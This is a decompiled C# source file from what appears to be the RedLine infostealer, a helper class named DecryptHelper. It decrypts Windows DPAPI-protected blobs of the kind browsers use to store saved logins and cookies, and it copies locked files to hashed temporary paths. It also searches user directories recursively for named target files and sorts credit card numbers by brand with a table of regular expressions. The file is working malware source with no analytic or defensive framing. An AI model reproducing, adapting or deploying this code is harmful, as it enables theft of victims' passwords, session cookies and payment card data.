using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace RedLine.Logic.Helpers
{
	// Token: 0x0200005A RID: 90
	public static class DecryptHelper
	{
		// Token: 0x0600028E RID: 654 RVA: 0x0000A440 File Offset: 0x00008640
		public static string Base64Decode(string input)
		{
			string result;
			try
			{
				result = Encoding.UTF8.GetString(Convert.FromBase64String(input));
			}
			catch
			{
				result = input;
			}
			return result;
		}

		// Token: 0x0600028F RID: 655 RVA: 0x0000A478 File Offset: 0x00008678
		public static string TryCreateTemp(string filePath, out bool createdNew)
		{
			string result;
			try
			{
				string text = DecryptHelper.CreateTempPath();
				File.Copy(filePath, text);
				createdNew = true;
				result = text;
			}
			catch
			{
				createdNew = false;
				result = filePath;
			}
			return result;
		}

		// Token: 0x06000290 RID: 656 RVA: 0x0000A4B4 File Offset: 0x000086B4
		public static string DetectCreditCardType(string number)
		{
			foreach (KeyValuePair<string, Regex> keyValuePair in DecryptHelper.CreditCardTypes)
			{
				if (keyValuePair.Value.Match(number.Replace(" ", "")).Success)
				{
					return keyValuePair.Key;
				}
			}
			return "Unknown";
		}

		// Token: 0x06000291 RID: 657 RVA: 0x0000A534 File Offset: 0x00008734
		public static string CreateTempPath()
		{
			return Path.Combine(Constants.LocalAppData, DecryptHelper.GetMd5Hash(string.Format("{0}{1}{2}", Environment.UserName, Math.Abs(DateTime.Now.ToFileTimeUtc()), Thread.CurrentThread.GetHashCode() + Thread.CurrentThread.ManagedThreadId)).Substring(0, 7));
		}

		// Token: 0x06000292 RID: 658 RVA: 0x0000A597 File Offset: 0x00008797
		public static string EncryptBlob(string rawText)
		{
			return Convert.ToBase64String(ProtectedData.Protect(Encoding.GetEncoding("windows-1251").GetBytes(rawText), null, DataProtectionScope.CurrentUser));
		}

		// Token: 0x06000293 RID: 659 RVA: 0x0000A5B5 File Offset: 0x000087B5
		public static string DecryptBlob(string EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
		{
			return Encoding.UTF8.GetString(DecryptHelper.DecryptBlob(Encoding.GetEncoding("windows-1251").GetBytes(EncryptedData), dataProtectionScope, entropy));
		}

		// Token: 0x06000294 RID: 660 RVA: 0x0000A5D8 File Offset: 0x000087D8
		public static byte[] DecryptBlob(byte[] EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
		{
			byte[] result;
			try
			{
				if (EncryptedData == null || EncryptedData.Length == 0)
				{
					result = null;
				}
				else
				{
					result = ProtectedData.Unprotect(EncryptedData, entropy, dataProtectionScope);
				}
			}
			catch (Exception)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x06000295 RID: 661 RVA: 0x0000A614 File Offset: 0x00008814
		public static byte[] ConvertHexStringToByteArray(string hexString)
		{
			if (hexString.Length % 2 != 0)
			{
				throw new ArgumentException(string.Format(CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", new object[]
				{
					hexString
				}));
			}
			byte[] array = new byte[hexString.Length / 2];
			for (int i = 0; i < array.Length; i++)
			{
				string s = hexString.Substring(i * 2, 2);
				array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
			}
			return array;
		}

		// Token: 0x06000296 RID: 662 RVA: 0x0000A688 File Offset: 0x00008888
		public static string GetMd5Hash(string source)
		{
			HashAlgorithm hashAlgorithm = new MD5CryptoServiceProvider();
			byte[] bytes = Encoding.ASCII.GetBytes(source);
			return DecryptHelper.GetHexString(hashAlgorithm.ComputeHash(bytes)).Replace("-", string.Empty);
		}

		// Token: 0x06000297 RID: 663 RVA: 0x0000A6C0 File Offset: 0x000088C0
		private static string GetHexString(IList<byte> bt)
		{
			string text = string.Empty;
			for (int i = 0; i < bt.Count; i++)
			{
				byte b = bt[i];
				int num = (int)(b & 15);
				int num2 = b >> 4 & 15;
				if (num2 > 9)
				{
					text += ((char)(num2 - 10 + 65)).ToString(CultureInfo.InvariantCulture);
				}
				else
				{
					text += num2.ToString(CultureInfo.InvariantCulture);
				}
				if (num > 9)
				{
					text += ((char)(num - 10 + 65)).ToString(CultureInfo.InvariantCulture);
				}
				else
				{
					text += num.ToString(CultureInfo.InvariantCulture);
				}
				if (i + 1 != bt.Count && (i + 1) % 2 == 0)
				{
					text += "-";
				}
			}
			return text;
		}

		// Token: 0x06000298 RID: 664 RVA: 0x0000A78C File Offset: 0x0000898C
		public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
		{
			List<string> list = new List<string>();
			list.Add("\\Windows\\");
			list.Add("\\Program Files\\");
			list.Add("\\Program Files (x86)\\");
			list.Add("\\Program Data\\");
			List<string> list2 = new List<string>();
			if (files == null || files.Length == 0 || level > maxLevel)
			{
				return list2;
			}
			try
			{
				foreach (string text in Directory.GetDirectories(baseDirectory))
				{
					bool flag = false;
					foreach (string value in list)
					{
						if (text.Contains(value))
						{
							flag = true;
							break;
						}
					}
					if (!flag)
					{
						try
						{
							DirectoryInfo directoryInfo = new DirectoryInfo(text);
							FileInfo[] files2 = directoryInfo.GetFiles();
							bool flag2 = false;
							int num = 0;
							while (num < files2.Length && !flag2)
							{
								int num2 = 0;
								while (num2 < files.Length && !flag2)
								{
									string a = files[num2];
									FileInfo fileInfo = files2[num];
									if (a == fileInfo.Name)
									{
										flag2 = true;
										list2.Add(fileInfo.FullName);
									}
									num2++;
								}
								num++;
							}
							foreach (string item in DecryptHelper.FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
							{
								if (!list2.Contains(item))
								{
									list2.Add(item);
								}
							}
						}
						catch
						{
						}
					}
				}
			}
			catch
			{
			}
			return list2;
		}

		// Token: 0x04000140 RID: 320
		private static Dictionary<string, Regex> CreditCardTypes = new Dictionary<string, Regex>
		{
			{
				"Amex Card",
				new Regex("^3[47][0-9]{13}$")
			},
			{
				"BCGlobal",
				new Regex("^(6541|6556)[0-9]{12}$")
			},
			{
				"Carte Blanche Card",
				new Regex("^389[0-9]{11}$")
			},
			{
				"Diners Club Card",
				new Regex("^3(?:0[0-5]|[68][0-9])[0-9]{11}$")
			},
			{
				"Discover Card",
				new Regex("6(?:011|5[0-9]{2})[0-9]{12}$")
			},
			{
				"Insta Payment Card",
				new Regex("^63[7-9][0-9]{13}$")
			},
			{
				"JCB Card",
				new Regex("^(?:2131|1800|35\\\\d{3})\\\\d{11}$")
			},
			{
				"KoreanLocalCard",
				new Regex("^9[0-9]{15}$")
			},
			{
				"Laser Card",
				new Regex("^(6304|6706|6709|6771)[0-9]{12,15}$")
			},
			{
				"Maestro Card",
				new Regex("^(5018|5020|5038|6304|6759|6761|6763)[0-9]{8,15}$")
			},
			{
				"Mastercard",
				new Regex("5[1-5][0-9]{14}$")
			},
			{
				"Solo Card",
				new Regex("^(6334|6767)[0-9]{12}|(6334|6767)[0-9]{14}|(6334|6767)[0-9]{15}$")
			},
			{
				"Switch Card",
				new Regex("^(4903|4905|4911|4936|6333|6759)[0-9]{12}|(4903|4905|4911|4936|6333|6759)[0-9]{14}|(4903|4905|4911|4936|6333|6759)[0-9]{15}|564182[0-9]{10}|564182[0-9]{12}|564182[0-9]{13}|633110[0-9]{10}|633110[0-9]{12}|633110[0-9]{13}$")
			},
			{
				"Union Pay Card",
				new Regex("^(62[0-9]{14,17})$")
			},
			{
				"Visa Card",
				new Regex("4[0-9]{12}(?:[0-9]{3})?$")
			},
			{
				"Visa Master Card",
				new Regex("^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$")
			},
			{
				"Express Card",
				new Regex("3[47][0-9]{13}$")
			}
		};
	}
}
